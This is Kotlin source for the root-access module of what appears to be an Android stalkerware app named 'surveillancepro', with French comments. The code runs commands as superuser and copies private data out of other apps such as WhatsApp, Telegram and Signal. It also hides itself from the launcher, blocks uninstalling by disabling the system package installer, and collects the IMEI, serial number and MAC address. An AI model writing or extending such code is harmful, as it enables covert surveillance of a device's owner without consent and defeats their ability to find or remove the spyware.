package com.surveillancepro.android.root

import android.content.Context
import android.util.Log
import java.io.BufferedReader
import java.io.DataOutputStream
import java.io.File
import java.io.InputStreamReader

/**
 * Gestionnaire d'accès ROOT.
 * Vérifie la disponibilité du root, exécute des commandes en tant que superuser,
 * et fournit des capacités avancées impossibles sans root :
 *
 * - Lecture directe des bases de données WhatsApp/Telegram/Signal
 * - Enregistrement d'appels (accès audio système)
 * - Masquage complet de l'app (invisible dans le launcher ET les paramètres)
 * - Accès aux fichiers internes de toutes les apps
 * - Lecture des SMS chiffrés (base de données brute)
 */
object RootManager {

    private const val TAG = "RootManager"

    data class RootResult(val success: Boolean, val output: String, val exitCode: Int)

    /**
     * Vérifie si le root est disponible sur cet appareil.
     */
    fun isRooted(): Boolean {
        val paths = arrayOf(
            "/system/bin/su", "/system/xbin/su", "/sbin/su",
            "/system/su", "/data/local/xbin/su", "/data/local/bin/su",
            "/data/local/su", "/su/bin/su",
            "/system/app/Superuser.apk", "/system/app/SuperSU.apk",
            "/system/app/Magisk.apk",
        )
        for (path in paths) {
            if (File(path).exists()) return true
        }
        // Test avec une commande su
        return try {
            val result = executeRootCommand("id")
            result.success && result.output.contains("uid=0")
        } catch (_: Exception) { false }
    }

    /**
     * Exécute une commande shell en tant que root.
     */
    fun executeRootCommand(command: String): RootResult {
        return try {
            val process = Runtime.getRuntime().exec("su")
            val os = DataOutputStream(process.outputStream)
            os.writeBytes("$command\n")
            os.writeBytes("exit\n")
            os.flush()

            val reader = BufferedReader(InputStreamReader(process.inputStream))
            val output = StringBuilder()
            var line: String?
            while (reader.readLine().also { line = it } != null) {
                output.appendLine(line)
            }

            val errReader = BufferedReader(InputStreamReader(process.errorStream))
            while (errReader.readLine().also { line = it } != null) {
                output.appendLine(line)
            }

            val exitCode = process.waitFor()
            RootResult(exitCode == 0, output.toString().trim(), exitCode)
        } catch (e: Exception) {
            RootResult(false, e.message ?: "Unknown error", -1)
        }
    }

    /**
     * Copie un fichier depuis les données privées d'une autre app (root requis).
     */
    fun readAppFile(packageName: String, relativePath: String): ByteArray? {
        val fullPath = "/data/data/$packageName/$relativePath"
        val tmpPath = "/data/local/tmp/sp_extract_${System.currentTimeMillis()}"
        try {
            val cp = executeRootCommand("cp '$fullPath' '$tmpPath' && chmod 644 '$tmpPath'")
            if (!cp.success) return null

            val file = File(tmpPath)
            if (!file.exists()) return null
            val bytes = file.readBytes()
            file.delete()
            executeRootCommand("rm -f '$tmpPath'")
            return bytes
        } catch (e: Exception) {
            Log.w(TAG, "readAppFile failed: ${e.message}")
            return null
        }
    }

    /**
     * Liste les fichiers dans le répertoire de données d'une app.
     */
    fun listAppFiles(packageName: String, subdir: String = ""): List<String> {
        val path = "/data/data/$packageName" + if (subdir.isNotEmpty()) "/$subdir" else ""
        val result = executeRootCommand("ls -la '$path' 2>/dev/null")
        if (!result.success) return emptyList()
        return result.output.lines().filter { it.isNotBlank() }
    }

    /**
     * Cache l'app du launcher et de la liste des apps récentes.
     */
    fun hideFromLauncher(context: Context): Boolean {
        val pkg = context.packageName
        val result = executeRootCommand(
            "pm disable '$pkg/com.surveillancepro.android.MainActivity' 2>/dev/null; " +
            "settings put global hidden_apps '$pkg' 2>/dev/null"
        )
        Log.d(TAG, "hideFromLauncher: ${result.output}")
        return result.success
    }

    /**
     * Rend l'app à nouveau visible.
     */
    fun showInLauncher(context: Context): Boolean {
        val pkg = context.packageName
        val result = executeRootCommand(
            "pm enable '$pkg/com.surveillancepro.android.MainActivity' 2>/dev/null"
        )
        return result.success
    }

    /**
     * Empêche l'utilisateur de désinstaller l'app (Device Admin via root).
     */
    fun preventUninstall(context: Context): Boolean {
        val pkg = context.packageName
        val result = executeRootCommand("pm disable-user --user 0 'com.android.packageinstaller' 2>/dev/null")
        return result.success
    }

    /**
     * Obtient des infos système avancées accessibles uniquement en root.
     */
    fun getAdvancedDeviceInfo(): Map<String, String> {
        val info = mutableMapOf<String, String>()
        try {
            val imei = executeRootCommand("service call iphonesubinfo 1 | grep -o '[0-9a-f]\\{8\\}' | tail -n +2 | while read hex; do printf '\\x'\"${'$'}{hex:6:2}\"'\\x'\"${'$'}{hex:4:2}\"'\\x'\"${'$'}{hex:2:2}\"'\\x'\"${'$'}{hex:0:2}\"; done")
            if (imei.success && imei.output.isNotBlank()) info["imei"] = imei.output.trim()

            val serial = executeRootCommand("getprop ro.serialno")
            if (serial.success) info["serial"] = serial.output.trim()

            val mac = executeRootCommand("cat /sys/class/net/wlan0/address 2>/dev/null")
            if (mac.success) info["macAddress"] = mac.output.trim()

            val bootloader = executeRootCommand("getprop ro.bootloader")
            if (bootloader.success) info["bootloader"] = bootloader.output.trim()
        } catch (_: Exception) {}
        return info
    }
}
